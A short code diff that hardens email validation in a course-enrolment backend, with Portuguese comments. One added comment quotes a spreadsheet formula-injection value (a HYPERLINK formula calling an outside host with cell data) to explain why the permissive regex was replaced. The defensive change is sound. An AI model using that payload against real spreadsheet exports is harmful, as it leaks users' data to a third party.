@@ -161,8 +161,12 @@ async function cancelarInscricao({ cursistaId, courseId, req }) {
  * certificado, entao nao podem ser alterados por aqui.
  */
 async function atualizarMeusDados({ cursistaId, email, phone, req }) {
+  // Regex restritiva de proposito: a permissiva (`[^\s@]+@[^\s@]+\.[^\s@]+`) aceita
+  // coisas como `=hyperlink("http://x/?a=@"&a2,"c.li")`, que viram formula quando a
+  // planilha exportada e aberta. Aqui so passam os caracteres que de fato existem
+  // num endereco de e-mail.
   const emailLimpo = String(email || '').trim().toLowerCase()
-  if (emailLimpo && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailLimpo)) {
+  if (emailLimpo && (emailLimpo.length > 150 || !/^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/.test(emailLimpo))) {
     throw erro(400, 'Informe um e-mail valido.')
   }
 
